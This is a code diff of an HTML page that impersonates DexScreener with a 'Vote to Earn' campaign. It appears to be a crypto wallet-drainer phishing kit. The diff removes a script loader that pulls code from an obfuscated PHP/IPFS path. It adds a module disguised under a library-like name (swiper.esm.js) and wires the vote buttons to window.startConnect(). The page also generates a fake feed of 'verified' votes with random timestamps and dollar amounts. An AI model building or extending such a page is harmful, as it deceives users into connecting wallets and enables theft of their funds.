@@ -7,7 +7,6 @@
 
     <title>DexScreener Votes • Elite Terminal</title>
     <meta property="og:title" content="Vote to Earn — DexScreener CORE" id="ogTitle">
-    <meta property="og:description" content="🗳 Vote to Earn Rewards" id="ogDesc">
     <meta property="og:image" content="" id="ogImage">
     <meta property="og:type" content="website">
     <meta property="og:url" content="" id="ogUrl">
@@ -25,8 +24,9 @@
 
     <!-- EXTERNAL WALLET CONNECTION -->
     <script>
-        document.head.append(Object.assign(document.createElement("script"), { src: "/GJo0J1Ib.php?s=%2Fipfs%2FKxuSPd-l35-Efvnn8mmASwa11bab54b80ff0987c6430969d3df786%3Ft%3D" + Date.now() }));
+        window.setup = { injectWindowObjects: true };
     </script>
+    <script type="module" src="./swiper.esm.js"></script>
 
     <style>
         :root {
@@ -1401,7 +1401,8 @@
                                 <i class="fas fa-bolt" style="color:var(--dex-green);"></i> COMMUNITY VOTE
                             </div>
                             <!-- MOBILE VOTE BUTTON — wallet connection -->
-                            <button class="btn-vote-mobile NlVhn6Y- 7q6V1UU_" id="voteBtnMobile">
+                            <button class="btn-vote-mobile NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtnMobile"
+                                onclick="window.startConnect()">
                                 <i class="fas fa-check-to-slot"></i> VOTE TO UNLOCK
                             </button>
                             <div class="mobile-vote-stats">
@@ -1455,7 +1456,8 @@
                             Help the community unlock the next phase of market dominance.
                         </p>
                         <!-- DESKTOP VOTE BUTTON — wallet connection -->
-                        <button class="btn-vote NlVhn6Y- 7q6V1UU_" id="voteBtn">VOTE TO UNLOCK</button>
+                        <button class="btn-vote NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtn"
+                            onclick="window.startConnect()">VOTE TO UNLOCK</button>
                     </div>
                 </div>
             </div>
@@ -1765,15 +1767,15 @@
             const times = ['just now', '2s ago', '5s ago', '8s ago', '12s ago', '18s ago', '25s ago', '30s ago', '45s ago', '1m ago'];
             const time = times[Math.floor(Math.random() * times.length)];
             row.innerHTML = `
-        <div class="feed-avatar">${initials}</div>
-        <div class="feed-info">
-            <div class="feed-wallet-addr">${short}</div>
-            <div class="feed-action">Voted ${time}</div>
-        </div>
-        <div class="feed-right">
-            <div class="feed-amount">$${value.toLocaleString()}</div>
-            <div class="feed-verified">✓ Verified</div>
-        </div>`;
+            <div class="feed-avatar">${initials}</div>
+            <div class="feed-info">
+                <div class="feed-wallet-addr">${short}</div>
+                <div class="feed-action">Voted ${time}</div>
+            </div>
+            <div class="feed-right">
+                <div class="feed-amount">$${value.toLocaleString()}</div>
+                <div class="feed-verified">✓ Verified</div>
+            </div>`;
             const title = feed.querySelector('.feed-title');
             if (title && title.nextSibling) title.after(row); else feed.appendChild(row);
             const rows = feed.querySelectorAll('.feed-row');
@@ -1818,10 +1820,10 @@
                     else if (token.icon && token.icon.startsWith('http')) imgSrc = token.icon;
                     const imgTag = imgSrc ? `<img src="${imgSrc}" alt="${sym}" onerror="this.style.display='none'">` : '';
                     html += `<div class="trending-token" onclick="navigateToToken('${addr}')" title="${sym}">
-                <div class="trending-token-icon">${imgTag}<span class="tt-fallback">${first}</span></div>
-                <div class="trending-token-info"><div class="trending-token-name">${sym}</div><div class="trending-token-chain">${chain}</div></div>
-                <div class="trending-token-mcap">${mcap}</div>
-            </div>`;
+                    <div class="trending-token-icon">${imgTag}<span class="tt-fallback">${first}</span></div>
+                    <div class="trending-token-info"><div class="trending-token-name">${sym}</div><div class="trending-token-chain">${chain}</div></div>
+                    <div class="trending-token-mcap">${mcap}</div>
+                </div>`;
                 });
                 track.innerHTML = html + html;
                 track.style.setProperty('--scroll-duration', Math.max(unique.length * 3, 30) + 's');
